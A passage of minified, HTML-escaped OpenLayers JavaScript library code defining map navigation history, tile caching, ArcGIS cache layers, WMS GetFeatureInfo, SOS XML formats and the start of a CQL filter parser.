1==a.childNodes.length&amp;&amp;3==a.childNodes[0].nodeType}};OpenLayers.Control.NavigationHistory=OpenLayers.Class(OpenLayers.Control,{type:OpenLayers.Control.TYPE_TOGGLE,previous:null,previousOptions:null,next:null,nextOptions:null,limit:50,autoActivate:!0,clearOnDeactivate:!1,registry:null,nextStack:null,previousStack:null,listeners:null,restoring:!1,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,[a]);this.registry=OpenLayers.Util.extend({moveend:this.getState},this.registry);a={trigger:OpenLayers.Function.bind(this.previousTrigger, this),displayClass:this.displayClass+" "+this.displayClass+"Previous"};OpenLayers.Util.extend(a,this.previousOptions);this.previous=new OpenLayers.Control.Button(a);a={trigger:OpenLayers.Function.bind(this.nextTrigger,this),displayClass:this.displayClass+" "+this.displayClass+"Next"};OpenLayers.Util.extend(a,this.nextOptions);this.next=new OpenLayers.Control.Button(a);this.clear()},onPreviousChange:function(a,b){a&amp;&amp;!this.previous.active?this.previous.activate():!a&amp;&amp;this.previous.active&amp;&amp;this.previous.deactivate()}, onNextChange:function(a,b){a&amp;&amp;!this.next.active?this.next.activate():!a&amp;&amp;this.next.active&amp;&amp;this.next.deactivate()},destroy:function(){OpenLayers.Control.prototype.destroy.apply(this);this.previous.destroy();this.next.destroy();this.deactivate();for(var a in this)this[a]=null},setMap:function(a){this.map=a;this.next.setMap(a);this.previous.setMap(a)},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.next.draw();this.previous.draw()},previousTrigger:function(){var a=this.previousStack.shift(), b=this.previousStack.shift();void 0!=b?(this.nextStack.unshift(a),this.previousStack.unshift(b),this.restoring=!0,this.restore(b),this.restoring=!1,this.onNextChange(this.nextStack[0],this.nextStack.length),this.onPreviousChange(this.previousStack[1],this.previousStack.length-1)):this.previousStack.unshift(a);return b},nextTrigger:function(){var a=this.nextStack.shift();void 0!=a&amp;&amp;(this.previousStack.unshift(a),this.restoring=!0,this.restore(a),this.restoring=!1,this.onNextChange(this.nextStack[0], this.nextStack.length),this.onPreviousChange(this.previousStack[1],this.previousStack.length-1));return a},clear:function(){this.previousStack=[];this.previous.deactivate();this.nextStack=[];this.next.deactivate()},getState:function(){return{center:this.map.getCenter(),resolution:this.map.getResolution(),projection:this.map.getProjectionObject(),units:this.map.getProjectionObject().getUnits()||this.map.units||this.map.baseLayer.units}},restore:function(a){var b,c;if(this.map.getProjectionObject()== a.projection)c=this.map.getZoomForResolution(a.resolution),b=a.center;else{b=a.center.clone();b.transform(a.projection,this.map.getProjectionObject());c=a.units;var d=this.map.getProjectionObject().getUnits()||this.map.units||this.map.baseLayer.units;c=this.map.getZoomForResolution((c&amp;&amp;d?OpenLayers.INCHES_PER_UNIT[c]/OpenLayers.INCHES_PER_UNIT[d]:1)*a.resolution)}this.map.setCenter(b,c)},setListeners:function(){this.listeners={};for(var a in this.registry)this.listeners[a]=OpenLayers.Function.bind(function(){if(!this.restoring){var b= this.registry[a].apply(this,arguments);this.previousStack.unshift(b);if(1&lt;this.previousStack.length)this.onPreviousChange(this.previousStack[1],this.previousStack.length-1);this.previousStack.length>this.limit+1&amp;&amp;this.previousStack.pop();0&lt;this.nextStack.length&amp;&amp;(this.nextStack=[],this.onNextChange(null,0))}return!0},this)},activate:function(){var a=!1;if(this.map&amp;&amp;OpenLayers.Control.prototype.activate.apply(this)){null==this.listeners&amp;&amp;this.setListeners();for(var b in this.listeners)this.map.events.register(b, this,this.listeners[b]);a=!0;0==this.previousStack.length&amp;&amp;this.initStack()}return a},initStack:function(){this.map.getCenter()&amp;&amp;this.listeners.moveend()},deactivate:function(){var a=!1;if(this.map&amp;&amp;OpenLayers.Control.prototype.deactivate.apply(this)){for(var b in this.listeners)this.map.events.unregister(b,this,this.listeners[b]);this.clearOnDeactivate&amp;&amp;this.clear();a=!0}return a},CLASS_NAME:"OpenLayers.Control.NavigationHistory"});OpenLayers.Layer.UTFGrid=OpenLayers.Class(OpenLayers.Layer.XYZ,{isBaseLayer:!1,projection:new OpenLayers.Projection("EPSG:900913"),useJSONP:!1,tileClass:OpenLayers.Tile.UTFGrid,initialize:function(a){OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a.name,a.url,{},a]);this.tileOptions=OpenLayers.Util.extend({utfgridResolution:this.utfgridResolution},this.tileOptions)},createBackBuffer:function(){},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.UTFGrid(this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this, [a])},getFeatureInfo:function(a){var b=null;(a=this.getTileData(a))&amp;&amp;a.tile&amp;&amp;(b=a.tile.getFeatureInfo(a.i,a.j));return b},getFeatureId:function(a){var b=null;a=this.getTileData(a);a.tile&amp;&amp;(b=a.tile.getFeatureId(a.i,a.j));return b},CLASS_NAME:"OpenLayers.Layer.UTFGrid"});OpenLayers.TileManager=OpenLayers.Class({cacheSize:256,tilesPerFrame:2,frameDelay:16,moveDelay:100,zoomDelay:200,maps:null,tileQueueId:null,tileQueue:null,tileCache:null,tileCacheIndex:null,initialize:function(a){OpenLayers.Util.extend(this,a);this.maps=[];this.tileQueueId={};this.tileQueue={};this.tileCache={};this.tileCacheIndex=[]},addMap:function(a){if(!this._destroyed&amp;&amp;OpenLayers.Layer.Grid){this.maps.push(a);this.tileQueue[a.id]=[];for(var b=0,c=a.layers.length;b&lt;c;++b)this.addLayer({layer:a.layers[b]}); a.events.on({move:this.move,zoomend:this.zoomEnd,changelayer:this.changeLayer,addlayer:this.addLayer,preremovelayer:this.removeLayer,scope:this})}},removeMap:function(a){if(!this._destroyed&amp;&amp;OpenLayers.Layer.Grid){window.clearTimeout(this.tileQueueId[a.id]);if(a.layers)for(var b=0,c=a.layers.length;b&lt;c;++b)this.removeLayer({layer:a.layers[b]});a.events&amp;&amp;a.events.un({move:this.move,zoomend:this.zoomEnd,changelayer:this.changeLayer,addlayer:this.addLayer,preremovelayer:this.removeLayer,scope:this}); delete this.tileQueue[a.id];delete this.tileQueueId[a.id];OpenLayers.Util.removeItem(this.maps,a)}},move:function(a){this.updateTimeout(a.object,this.moveDelay,!0)},zoomEnd:function(a){this.updateTimeout(a.object,this.zoomDelay)},changeLayer:function(a){"visibility"!==a.property&amp;&amp;"params"!==a.property||this.updateTimeout(a.object,0)},addLayer:function(a){a=a.layer;if(a instanceof OpenLayers.Layer.Grid){a.events.on({addtile:this.addTile,retile:this.clearTileQueue,scope:this});var b,c,d;for(b=a.grid.length- 1;0&lt;=b;--b)for(c=a.grid[b].length-1;0&lt;=c;--c)d=a.grid[b][c],this.addTile({tile:d}),d.url&amp;&amp;!d.imgDiv&amp;&amp;this.manageTileCache({object:d})}},removeLayer:function(a){a=a.layer;if(a instanceof OpenLayers.Layer.Grid&amp;&amp;(this.clearTileQueue({object:a}),a.events&amp;&amp;a.events.un({addtile:this.addTile,retile:this.clearTileQueue,scope:this}),a.grid)){var b,c,d;for(b=a.grid.length-1;0&lt;=b;--b)for(c=a.grid[b].length-1;0&lt;=c;--c)d=a.grid[b][c],this.unloadTile({object:d})}},updateTimeout:function(a,b,c){window.clearTimeout(this.tileQueueId[a.id]); var d=this.tileQueue[a.id];if(!c||d.length)this.tileQueueId[a.id]=window.setTimeout(OpenLayers.Function.bind(function(){this.drawTilesFromQueue(a);d.length&amp;&amp;this.updateTimeout(a,this.frameDelay)},this),b)},addTile:function(a){if(a.tile instanceof OpenLayers.Tile.Image)a.tile.events.on({beforedraw:this.queueTileDraw,beforeload:this.manageTileCache,loadend:this.addToCache,unload:this.unloadTile,scope:this});else this.removeLayer({layer:a.tile.layer})},unloadTile:function(a){a=a.object;a.events.un({beforedraw:this.queueTileDraw, beforeload:this.manageTileCache,loadend:this.addToCache,unload:this.unloadTile,scope:this});OpenLayers.Util.removeItem(this.tileQueue[a.layer.map.id],a)},queueTileDraw:function(a){a=a.object;var b=!1,c=a.layer,d=c.getURL(a.bounds),e=this.tileCache[d];e&amp;&amp;"olTileImage"!==e.className&amp;&amp;(delete this.tileCache[d],OpenLayers.Util.removeItem(this.tileCacheIndex,d),e=null);!c.url||!c.async&amp;&amp;e||(b=this.tileQueue[c.map.id],~OpenLayers.Util.indexOf(b,a)||b.push(a),b=!0);return!b},drawTilesFromQueue:function(a){var b= this.tileQueue[a.id],c=this.tilesPerFrame;for(a=a.zoomTween&amp;&amp;a.zoomTween.playing;!a&amp;&amp;b.length&amp;&amp;c;)b.shift().draw(!0),--c},manageTileCache:function(a){a=a.object;var b=this.tileCache[a.url];b&amp;&amp;(b.parentNode&amp;&amp;OpenLayers.Element.hasClass(b.parentNode,"olBackBuffer")&amp;&amp;(b.parentNode.removeChild(b),b.id=null),b.parentNode||(b.style.visibility="hidden",b.style.opacity=0,a.setImage(b),OpenLayers.Util.removeItem(this.tileCacheIndex,a.url),this.tileCacheIndex.push(a.url)))},addToCache:function(a){a=a.object; this.tileCache[a.url]||OpenLayers.Element.hasClass(a.imgDiv,"olImageLoadError")||(this.tileCacheIndex.length>=this.cacheSize&amp;&amp;(delete this.tileCache[this.tileCacheIndex[0]],this.tileCacheIndex.shift()),this.tileCache[a.url]=a.imgDiv,this.tileCacheIndex.push(a.url))},clearTileQueue:function(a){a=a.object;for(var b=this.tileQueue[a.map.id],c=b.length-1;0&lt;=c;--c)b[c].layer===a&amp;&amp;b.splice(c,1)},destroy:function(){for(var a=this.maps.length-1;0&lt;=a;--a)this.removeMap(this.maps[a]);this.tileCacheIndex=this.tileCache= this.tileQueueId=this.tileQueue=this.maps=null;this._destroyed=!0}});OpenLayers.Layer.ArcGISCache=OpenLayers.Class(OpenLayers.Layer.XYZ,{url:null,tileOrigin:null,tileSize:new OpenLayers.Size(256,256),useArcGISServer:!0,type:"png",useScales:!1,overrideDPI:!1,initialize:function(a,b,c){OpenLayers.Layer.XYZ.prototype.initialize.apply(this,arguments);this.resolutions&amp;&amp;(this.serverResolutions=this.resolutions,this.maxExtent=this.getMaxExtentForResolution(this.resolutions[0]));if(this.layerInfo){var d=this.layerInfo,e=new OpenLayers.Bounds(d.fullExtent.xmin,d.fullExtent.ymin, d.fullExtent.xmax,d.fullExtent.ymax);this.projection="EPSG:"+d.spatialReference.wkid;this.sphericalMercator=102100==d.spatialReference.wkid;this.units="esriFeet"==d.units?"ft":"m";if(d.tileInfo){this.tileSize=new OpenLayers.Size(d.tileInfo.width||d.tileInfo.cols,d.tileInfo.height||d.tileInfo.rows);this.tileOrigin=new OpenLayers.LonLat(d.tileInfo.origin.x,d.tileInfo.origin.y);var f=new OpenLayers.Geometry.Point(e.left,e.top),e=new OpenLayers.Geometry.Point(e.right,e.bottom);this.useScales?this.scales= []:this.resolutions=[];this.lods=[];for(var g in d.tileInfo.lods)if(d.tileInfo.lods.hasOwnProperty(g)){var h=d.tileInfo.lods[g];this.useScales?this.scales.push(h.scale):this.resolutions.push(h.resolution);var k=this.getContainingTileCoords(f,h.resolution);h.startTileCol=k.x;h.startTileRow=k.y;k=this.getContainingTileCoords(e,h.resolution);h.endTileCol=k.x;h.endTileRow=k.y;this.lods.push(h)}this.maxExtent=this.calculateMaxExtentWithLOD(this.lods[0]);this.serverResolutions=this.resolutions;this.overrideDPI&amp;&amp; d.tileInfo.dpi&amp;&amp;(OpenLayers.DOTS_PER_INCH=d.tileInfo.dpi)}}},getContainingTileCoords:function(a,b){return new OpenLayers.Pixel(Math.max(Math.floor((a.x-this.tileOrigin.lon)/(this.tileSize.w*b)),0),Math.max(Math.floor((this.tileOrigin.lat-a.y)/(this.tileSize.h*b)),0))},calculateMaxExtentWithLOD:function(a){var b=this.tileOrigin.lon+a.startTileCol*this.tileSize.w*a.resolution,c=this.tileOrigin.lat-a.startTileRow*this.tileSize.h*a.resolution;return new OpenLayers.Bounds(b,c-(a.endTileRow-a.startTileRow+ 1)*this.tileSize.h*a.resolution,b+(a.endTileCol-a.startTileCol+1)*this.tileSize.w*a.resolution,c)},calculateMaxExtentWithExtent:function(a,b){var c=new OpenLayers.Geometry.Point(a.left,a.top),d=new OpenLayers.Geometry.Point(a.right,a.bottom),c=this.getContainingTileCoords(c,b),d=this.getContainingTileCoords(d,b);return this.calculateMaxExtentWithLOD({resolution:b,startTileCol:c.x,startTileRow:c.y,endTileCol:d.x,endTileRow:d.y})},getUpperLeftTileCoord:function(a){var b=new OpenLayers.Geometry.Point(this.maxExtent.left, this.maxExtent.top);return this.getContainingTileCoords(b,a)},getLowerRightTileCoord:function(a){var b=new OpenLayers.Geometry.Point(this.maxExtent.right,this.maxExtent.bottom);return this.getContainingTileCoords(b,a)},getMaxExtentForResolution:function(a){var b=this.getUpperLeftTileCoord(a),c=this.getLowerRightTileCoord(a),d=this.tileOrigin.lon+b.x*this.tileSize.w*a,e=this.tileOrigin.lat-b.y*this.tileSize.h*a;return new OpenLayers.Bounds(d,e-(c.y-b.y+1)*this.tileSize.h*a,d+(c.x-b.x+1)*this.tileSize.w* a,e)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.ArcGISCache(this.name,this.url,this.options));return OpenLayers.Layer.XYZ.prototype.clone.apply(this,[a])},initGriddedTiles:function(a){delete this._tileOrigin;OpenLayers.Layer.XYZ.prototype.initGriddedTiles.apply(this,arguments)},getMaxExtent:function(){var a=this.map.getResolution();return this.maxExtent=this.getMaxExtentForResolution(a)},getTileOrigin:function(){if(!this._tileOrigin){var a=this.getMaxExtent();this._tileOrigin=new OpenLayers.LonLat(a.left, a.bottom)}return this._tileOrigin},getURL:function(a){var b=this.getResolution(),c=this.tileOrigin.lon+b*this.tileSize.w/2,d=this.tileOrigin.lat-b*this.tileSize.h/2;a=a.getCenterLonLat();c=Math.round(Math.abs((a.lon-c)/(b*this.tileSize.w)));d=Math.round(Math.abs((d-a.lat)/(b*this.tileSize.h)));a=this.map.getZoom();if(this.lods){if(b=this.lods[this.map.getZoom()],c&lt;b.startTileCol||c>b.endTileCol||d&lt;b.startTileRow||d>b.endTileRow)return null}else{var e=this.getUpperLeftTileCoord(b),b=this.getLowerRightTileCoord(b); if(c&lt;e.x||c>=b.x||d&lt;e.y||d>=b.y)return null}b=this.url;e=""+c+d+a;OpenLayers.Util.isArray(b)&amp;&amp;(b=this.selectUrl(e,b));this.useArcGISServer?b+="/tile/${z}/${y}/${x}":(c="C"+OpenLayers.Number.zeroPad(c,8,16),d="R"+OpenLayers.Number.zeroPad(d,8,16),a="L"+OpenLayers.Number.zeroPad(a,2,10),b=b+"/${z}/${y}/${x}."+this.type);b=OpenLayers.String.format(b,{x:c,y:d,z:a});return OpenLayers.Util.urlAppend(b,OpenLayers.Util.getParameterString(this.params))},CLASS_NAME:"OpenLayers.Layer.ArcGISCache"});OpenLayers.Control.WMSGetFeatureInfo=OpenLayers.Class(OpenLayers.Control,{hover:!1,drillDown:!1,maxFeatures:10,clickCallback:"click",output:"features",layers:null,queryVisible:!1,url:null,layerUrls:null,infoFormat:"text/html",vendorParams:{},format:null,formatOptions:null,handler:null,hoverRequest:null,initialize:function(a){a=a||{};a.handlerOptions=a.handlerOptions||{};OpenLayers.Control.prototype.initialize.apply(this,[a]);this.format||(this.format=new OpenLayers.Format.WMSGetFeatureInfo(a.formatOptions)); !0===this.drillDown&amp;&amp;(this.hover=!1);this.hover?this.handler=new OpenLayers.Handler.Hover(this,{move:this.cancelHover,pause:this.getInfoForHover},OpenLayers.Util.extend(this.handlerOptions.hover||{},{delay:250})):(a={},a[this.clickCallback]=this.getInfoForClick,this.handler=new OpenLayers.Handler.Click(this,a,this.handlerOptions.click||{}))},getInfoForClick:function(a){this.events.triggerEvent("beforegetfeatureinfo",{xy:a.xy});OpenLayers.Element.addClass(this.map.viewPortDiv,"olCursorWait");this.request(a.xy, {})},getInfoForHover:function(a){this.events.triggerEvent("beforegetfeatureinfo",{xy:a.xy});this.request(a.xy,{hover:!0})},cancelHover:function(){this.hoverRequest&amp;&amp;(this.hoverRequest.abort(),this.hoverRequest=null)},findLayers:function(){for(var a=this.layers||this.map.layers,b=[],c,d,e=a.length-1;0&lt;=e;--e)c=a[e],c instanceof OpenLayers.Layer.WMS&amp;&amp;(!this.queryVisible||c.getVisibility())&amp;&amp;(d=OpenLayers.Util.isArray(c.url)?c.url[0]:c.url,!1!==this.drillDown||this.url||(this.url=d),(!0===this.drillDown|| this.urlMatches(d))&amp;&amp;b.push(c));return b},urlMatches:function(a){var b=OpenLayers.Util.isEquivalentUrl(this.url,a);if(!b&amp;&amp;this.layerUrls)for(var c=0,d=this.layerUrls.length;c&lt;d;++c)if(OpenLayers.Util.isEquivalentUrl(this.layerUrls[c],a)){b=!0;break}return b},buildWMSOptions:function(a,b,c,d){for(var e=[],f=[],g=0,h=b.length;g&lt;h;g++)null!=b[g].params.LAYERS&amp;&amp;(e=e.concat(b[g].params.LAYERS),f=f.concat(this.getStyleNames(b[g])));b=b[0];g=this.map.getProjection();(h=b.projection)&amp;&amp;h.equals(this.map.getProjectionObject())&amp;&amp; (g=h.getCode());d=OpenLayers.Util.extend({service:"WMS",version:b.params.VERSION,request:"GetFeatureInfo",exceptions:b.params.EXCEPTIONS,bbox:this.map.getExtent().toBBOX(null,b.reverseAxisOrder()),feature_count:this.maxFeatures,height:this.map.getSize().h,width:this.map.getSize().w,format:d,info_format:b.params.INFO_FORMAT||this.infoFormat},1.3&lt;=parseFloat(b.params.VERSION)?{crs:g,i:parseInt(c.x),j:parseInt(c.y)}:{srs:g,x:parseInt(c.x),y:parseInt(c.y)});0!=e.length&amp;&amp;(d=OpenLayers.Util.extend({layers:e, query_layers:e,styles:f},d));OpenLayers.Util.applyDefaults(d,this.vendorParams);return{url:a,params:OpenLayers.Util.upperCaseObject(d),callback:function(b){this.handleResponse(c,b,a)},scope:this}},getStyleNames:function(a){return a.params.STYLES?a.params.STYLES:OpenLayers.Util.isArray(a.params.LAYERS)?Array(a.params.LAYERS.length):a.params.LAYERS.replace(/[^,]/g,"")},request:function(a,b){var c=this.findLayers();if(0==c.length)this.events.triggerEvent("nogetfeatureinfo"),OpenLayers.Element.removeClass(this.map.viewPortDiv, "olCursorWait");else if(b=b||{},!1===this.drillDown){var c=this.buildWMSOptions(this.url,c,a,c[0].params.FORMAT),d=OpenLayers.Request.GET(c);!0===b.hover&amp;&amp;(this.hoverRequest=d)}else{this._numRequests=this._requestCount=0;this.features=[];for(var d={},e,f=0,g=c.length;f&lt;g;f++){var h=c[f];e=OpenLayers.Util.isArray(h.url)?h.url[0]:h.url;e in d?d[e].push(h):(this._numRequests++,d[e]=[h])}for(e in d)c=d[e],c=this.buildWMSOptions(e,c,a,c[0].params.FORMAT),OpenLayers.Request.GET(c)}},triggerGetFeatureInfo:function(a, b,c){this.events.triggerEvent("getfeatureinfo",{text:a.responseText,features:c,request:a,xy:b});OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait")},handleResponse:function(a,b,c){var d=b.responseXML;d&amp;&amp;d.documentElement||(d=b.responseText);d=this.format.read(d);!1===this.drillDown?this.triggerGetFeatureInfo(b,a,d):(this._requestCount++,this._features="object"===this.output?(this._features||[]).concat({url:c,features:d}):(this._features||[]).concat(d),this._requestCount===this._numRequests&amp;&amp; (this.triggerGetFeatureInfo(b,a,this._features.concat()),delete this._features,delete this._requestCount,delete this._numRequests))},CLASS_NAME:"OpenLayers.Control.WMSGetFeatureInfo"});OpenLayers.Format.WMSCapabilities.v1_3_0=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_3,{version:"1.3.0",CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_3_0"});OpenLayers.Format.SOSGetFeatureOfInterest=OpenLayers.Class(OpenLayers.Format.XML,{VERSION:"1.0.0",namespaces:{sos:"http://www.opengis.net/sos/1.0",gml:"http://www.opengis.net/gml",sa:"http://www.opengis.net/sampling/1.0",xsi:"http://www.w3.org/2001/XMLSchema-instance"},schemaLocation:"http://www.opengis.net/sos/1.0 http://schemas.opengis.net/sos/1.0.0/sosAll.xsd",defaultPrefix:"sos",regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},read:function(a){"string"== typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={features:[]};this.readNode(a,b);a=[];for(var c=0,d=b.features.length;c&lt;d;c++){var e=b.features[c];this.internalProjection&amp;&amp;(this.externalProjection&amp;&amp;e.components[0])&amp;&amp;e.components[0].transform(this.externalProjection,this.internalProjection);e=new OpenLayers.Feature.Vector(e.components[0],e.attributes);a.push(e)}return a},readers:{sa:{SamplingPoint:function(a,b){if(!b.attributes){var c= {attributes:{}};b.features.push(c);b=c}b.attributes.id=this.getAttributeNS(a,this.namespaces.gml,"id");this.readChildNodes(a,b)},position:function(a,b){this.readChildNodes(a,b)}},gml:OpenLayers.Util.applyDefaults({FeatureCollection:function(a,b){this.readChildNodes(a,b)},featureMember:function(a,b){var c={attributes:{}};b.features.push(c);this.readChildNodes(a,c)},name:function(a,b){b.attributes.name=this.getChildValue(a)},pos:function(a,b){this.externalProjection||(this.externalProjection=new OpenLayers.Projection(a.getAttribute("srsName"))); OpenLayers.Format.GML.v3.prototype.readers.gml.pos.apply(this,[a,b])}},OpenLayers.Format.GML.v3.prototype.readers.gml)},writers:{sos:{GetFeatureOfInterest:function(a){for(var b=this.createElementNSPlus("GetFeatureOfInterest",{attributes:{version:this.VERSION,service:"SOS","xsi:schemaLocation":this.schemaLocation}}),c=0,d=a.fois.length;c&lt;d;c++)this.writeNode("FeatureOfInterestId",{foi:a.fois[c]},b);return b},FeatureOfInterestId:function(a){return this.createElementNSPlus("FeatureOfInterestId",{value:a.foi})}}}, CLASS_NAME:"OpenLayers.Format.SOSGetFeatureOfInterest"});OpenLayers.Format.SOSGetObservation=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ows:"http://www.opengis.net/ows",gml:"http://www.opengis.net/gml",sos:"http://www.opengis.net/sos/1.0",ogc:"http://www.opengis.net/ogc",om:"http://www.opengis.net/om/1.0",sa:"http://www.opengis.net/sampling/1.0",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},VERSION:"1.0.0",schemaLocation:"http://www.opengis.net/sos/1.0 http://schemas.opengis.net/sos/1.0.0/sosGetObservation.xsd", defaultPrefix:"sos",read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={measurements:[],observations:[]};this.readNode(a,b);return b},write:function(a){a=this.writeNode("sos:GetObservation",a);a.setAttribute("xmlns:om",this.namespaces.om);a.setAttribute("xmlns:ogc",this.namespaces.ogc);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this, [a])},readers:{om:{ObservationCollection:function(a,b){b.id=this.getAttributeNS(a,this.namespaces.gml,"id");this.readChildNodes(a,b)},member:function(a,b){this.readChildNodes(a,b)},Measurement:function(a,b){var c={};b.measurements.push(c);this.readChildNodes(a,c)},Observation:function(a,b){var c={};b.observations.push(c);this.readChildNodes(a,c)},samplingTime:function(a,b){var c={};b.samplingTime=c;this.readChildNodes(a,c)},observedProperty:function(a,b){b.observedProperty=this.getAttributeNS(a,this.namespaces.xlink, "href");this.readChildNodes(a,b)},procedure:function(a,b){b.procedure=this.getAttributeNS(a,this.namespaces.xlink,"href");this.readChildNodes(a,b)},featureOfInterest:function(a,b){var c={features:[]};b.fois=[];b.fois.push(c);this.readChildNodes(a,c);for(var d=[],e=0,f=c.features.length;e&lt;f;e++){var g=c.features[e];d.push(new OpenLayers.Feature.Vector(g.components[0],g.attributes))}c.features=d},result:function(a,b){var c={};b.result=c;""!==this.getChildValue(a)?(c.value=this.getChildValue(a),c.uom= a.getAttribute("uom")):this.readChildNodes(a,c)}},sa:OpenLayers.Format.SOSGetFeatureOfInterest.prototype.readers.sa,gml:OpenLayers.Util.applyDefaults({TimeInstant:function(a,b){var c={};b.timeInstant=c;this.readChildNodes(a,c)},timePosition:function(a,b){b.timePosition=this.getChildValue(a)}},OpenLayers.Format.SOSGetFeatureOfInterest.prototype.readers.gml)},writers:{sos:{GetObservation:function(a){var b=this.createElementNSPlus("GetObservation",{attributes:{version:this.VERSION,service:"SOS"}});this.writeNode("offering", a,b);a.eventTime&amp;&amp;this.writeNode("eventTime",a,b);for(var c in a.procedures)this.writeNode("procedure",a.procedures[c],b);for(var d in a.observedProperties)this.writeNode("observedProperty",a.observedProperties[d],b);a.foi&amp;&amp;this.writeNode("featureOfInterest",a.foi,b);this.writeNode("responseFormat",a,b);a.resultModel&amp;&amp;this.writeNode("resultModel",a,b);a.responseMode&amp;&amp;this.writeNode("responseMode",a,b);return b},featureOfInterest:function(a){var b=this.createElementNSPlus("featureOfInterest");this.writeNode("ObjectID", a.objectId,b);return b},ObjectID:function(a){return this.createElementNSPlus("ObjectID",{value:a})},responseFormat:function(a){return this.createElementNSPlus("responseFormat",{value:a.responseFormat})},procedure:function(a){return this.createElementNSPlus("procedure",{value:a})},offering:function(a){return this.createElementNSPlus("offering",{value:a.offering})},observedProperty:function(a){return this.createElementNSPlus("observedProperty",{value:a})},eventTime:function(a){var b=this.createElementNSPlus("eventTime"); "latest"===a.eventTime&amp;&amp;this.writeNode("ogc:TM_Equals",a,b);return b},resultModel:function(a){return this.createElementNSPlus("resultModel",{value:a.resultModel})},responseMode:function(a){return this.createElementNSPlus("responseMode",{value:a.responseMode})}},ogc:{TM_Equals:function(a){var b=this.createElementNSPlus("ogc:TM_Equals");this.writeNode("ogc:PropertyName",{property:"urn:ogc:data:time:iso8601"},b);"latest"===a.eventTime&amp;&amp;this.writeNode("gml:TimeInstant",{value:"latest"},b);return b},PropertyName:function(a){return this.createElementNSPlus("ogc:PropertyName", {value:a.property})}},gml:{TimeInstant:function(a){var b=this.createElementNSPlus("gml:TimeInstant");this.writeNode("gml:timePosition",a,b);return b},timePosition:function(a){return this.createElementNSPlus("gml:timePosition",{value:a.value})}}},CLASS_NAME:"OpenLayers.Format.SOSGetObservation"});OpenLayers.Control.UTFGrid=OpenLayers.Class(OpenLayers.Control,{autoActivate:!0,layers:null,defaultHandlerOptions:{delay:300,pixelTolerance:4,stopMove:!1,single:!0,"double":!1,stopSingle:!1,stopDouble:!1},handlerMode:"click",setHandler:function(a){this.handlerMode=a;this.resetHandler()},resetHandler:function(){this.handler&amp;&amp;(this.handler.deactivate(),this.handler.destroy(),this.handler=null);"hover"==this.handlerMode?this.handler=new OpenLayers.Handler.Hover(this,{pause:this.handleEvent,move:this.reset}, this.handlerOptions):"click"==this.handlerMode?this.handler=new OpenLayers.Handler.Click(this,{click:this.handleEvent},this.handlerOptions):"move"==this.handlerMode&amp;&amp;(this.handler=new OpenLayers.Handler.Hover(this,{pause:this.handleEvent,move:this.handleEvent},this.handlerOptions));return this.handler?!0:!1},initialize:function(a){a=a||{};a.handlerOptions=a.handlerOptions||this.defaultHandlerOptions;OpenLayers.Control.prototype.initialize.apply(this,[a]);this.resetHandler()},handleEvent:function(a){if(null== a)this.reset();else{var b=this.map.getLonLatFromPixel(a.xy);if(b){var c=this.findLayers();if(0&lt;c.length){for(var d={},e,f,g=0,h=c.length;g&lt;h;g++)e=c[g],f=OpenLayers.Util.indexOf(this.map.layers,e),d[f]=e.getFeatureInfo(b);this.callback(d,b,a.xy)}}}},callback:function(a){},reset:function(a){this.callback(null)},findLayers:function(){for(var a=this.layers||this.map.layers,b=[],c,d=a.length-1;0&lt;=d;--d)c=a[d],c instanceof OpenLayers.Layer.UTFGrid&amp;&amp;b.push(c);return b},CLASS_NAME:"OpenLayers.Control.UTFGrid"});OpenLayers.Format.CQL=function(){function a(a){function b(){var a=e.pop();switch(a.type){case "LOGICAL":var c=b(),g=b();return new OpenLayers.Filter.Logical({filters:[g,c],type:f[a.text.toUpperCase()]});case "NOT":return a=b(),new OpenLayers.Filter.Logical({filters:[a],type:OpenLayers.Filter.Logical.NOT});case "BETWEEN":return e.pop(),g=b(),a=b(),c=b(),new OpenLayers.Filter.Comparison({property:c,lowerBoundary:a,upperBoundary:g,type:OpenLayers.Filter.Comparison.BETWEEN});case "COMPARISON":return g= b(),c=b(),new OpenLayers.Filter.Comparison({property:c,value:g,type:d[a.text.toUpperCase()]});case "IS_NULL":return c=b(),new OpenLayers.Filter.Comparison({property:c,type:d[a.text.toUpperCase()]});case "VALUE":return(c=a.text.match(/^'(.*)'$/))?c[1].replace(/''/g,"'"):Number(a.text);case "SPATIAL":switch(a.text.toUpperCase()){case "BBOX":var a=b(),c=b(),g=b(),h=b(),k=b();return new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.BBOX,property:k,value:OpenLayers.Bounds.fromArray([h,g,c, a])});case "INTERSECTS":return g=b(),c=b(),new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.INTERSECTS,property:c,value:g});case "WITHIN":return g=b(),c=b(),new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.WITHIN,property:c,value:g});case "CONTAINS":return g=b(),c=b(),new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.CONTAINS,property:c,value:g});case "DWITHIN":return a=b(),g=b(),c=b(),new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.DWITHIN,value:g, property:c,distance:Number(a)})}case "GEOMETRY":return OpenLayers.Geometry.fromWKT(a.text);default:return a.text}}for(var c=[],e=[];a.length;){var g=a.shift();switch(g.type){case "PROPERTY":case 